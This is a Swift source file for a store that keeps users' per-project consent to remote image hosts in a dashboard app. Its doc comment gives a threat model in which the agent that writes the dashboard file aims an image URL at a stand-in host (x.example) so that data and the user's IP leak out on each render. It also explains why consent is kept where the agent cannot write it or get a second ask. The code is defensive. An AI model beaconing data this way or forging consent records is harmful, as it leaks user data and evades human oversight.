import Foundation

/// Which remote image hosts the user has agreed to let a project's
/// dashboard contact.
///
/// **The problem (P8 SEC-M4).** An image widget in `.scarf/dashboard.json`
/// fires its request the moment the dashboard renders: no click, no
/// chrome, nothing to decline — and the dashboard re-renders on every
/// watcher tick. `dashboard.json` is written by the agent. So the widget is
/// a beacon the agent aims: `https://x.example/p.png?d=<whatever it wants
/// to say>` is a GET made from the user's machine, through the user's
/// network, reporting the user's IP, repeatedly, to a host the user never
/// chose. Restricting the scheme to `https` (which shipped earlier) closed
/// the local-file read and the plaintext channel; it did not and could not
/// close this, because a remote image IS a request.
///
/// **The gate.** First render of a host shows a placeholder naming it, with
/// an Allow button. Nothing is fetched until the user presses it. The
/// answer is remembered per (project, host) so a dashboard the user has
/// blessed doesn't nag on every tick, and it is scoped to the HOST rather
/// than the URL so an agent can't re-ask its way through by changing the
/// path — and so allowing one image doesn't allow a different server.
///
/// **Where it lives, and why not on disk.** In `UserDefaults`, in the app's
/// own container. Every candidate inside `~/.hermes` — the project's
/// `.scarf/`, the registry directory, a sidecar beside the grants file — is
/// writable by the agent whose dashboard is doing the asking, and a consent
/// record the asker can write is not a consent record (the same reasoning
/// that put the mini-app grant key in the Keychain and made the grants file
/// per-machine). This is a decision a person made at a machine; it does not
/// travel with the repo and must not.
///
/// Local files and project-contained images never reach here — they are
/// resolved under the project root by `WidgetPathResolver` and involve no
/// network at all.
public struct ImageHostConsentStore: Sendable {

    /// Held as a NAME rather than a `UserDefaults` instance so the store
    /// stays a `Sendable` value type (`UserDefaults` is not `Sendable`,
    /// though it is thread-safe). Resolving per call is a dictionary
    /// lookup — these are user-interaction-rate operations.
    private let suiteName: String?
    private static let keyPrefix = "com.scarf.imageWidget.allowedHosts."

    /// - Parameter suiteName: a test-only defaults suite, so a suite can
    ///   allow and revoke without touching the user's real preferences.
    public nonisolated init(suiteName: String? = nil) {
        self.suiteName = suiteName
    }

    private nonisolated var defaults: UserDefaults {
        guard let suiteName, let suite = UserDefaults(suiteName: suiteName) else {
            return .standard
        }
        return suite
    }

    /// Whether `url`'s host has been allowed for `projectId`.
    ///
    /// A URL with no host, or one whose host doesn't normalize, is never
    /// allowed: there is nothing to have consented to.
    public nonisolated func isAllowed(url: URL, projectId: String) -> Bool {
        guard let host = Self.normalizedHost(url) else { return false }
        return allowedHosts(projectId: projectId).contains(host)
    }

    public nonisolated func allowedHosts(projectId: String) -> Set<String> {
        Set(defaults.stringArray(forKey: Self.key(projectId)) ?? [])
    }

    /// Record the user's approval of `url`'s host for this project.
    /// Returns the normalized host, or `nil` when there wasn't one.
    @discardableResult
    public nonisolated func allow(url: URL, projectId: String) -> String? {
        guard let host = Self.normalizedHost(url) else { return nil }
        var hosts = allowedHosts(projectId: projectId)
        hosts.insert(host)
        defaults.set(hosts.sorted(), forKey: Self.key(projectId))
        return host
    }

    public nonisolated func revoke(host: String, projectId: String) {
        var hosts = allowedHosts(projectId: projectId)
        hosts.remove(host.lowercased())
        if hosts.isEmpty {
            defaults.removeObject(forKey: Self.key(projectId))
        } else {
            defaults.set(hosts.sorted(), forKey: Self.key(projectId))
        }
    }

    public nonisolated func revokeAll(projectId: String) {
        defaults.removeObject(forKey: Self.key(projectId))
    }

    /// The host as it is compared and displayed: lowercased, with no
    /// trailing dot (`example.com.` and `EXAMPLE.com` are one host, and
    /// treating them as two would let an agent get a second ask).
    public nonisolated static func normalizedHost(_ url: URL) -> String? {
        guard var host = url.host?.lowercased(), !host.isEmpty else { return nil }
        while host.hasSuffix(".") { host = String(host.dropLast()) }
        return host.isEmpty ? nil : host
    }

    /// Keyed by the project id the caller already has (its path, on the
    /// surfaces that lack a UUID) — consent is per project, because a
    /// dashboard the user trusts says nothing about another project's.
    private nonisolated static func key(_ projectId: String) -> String {
        keyPrefix + projectId
    }
}
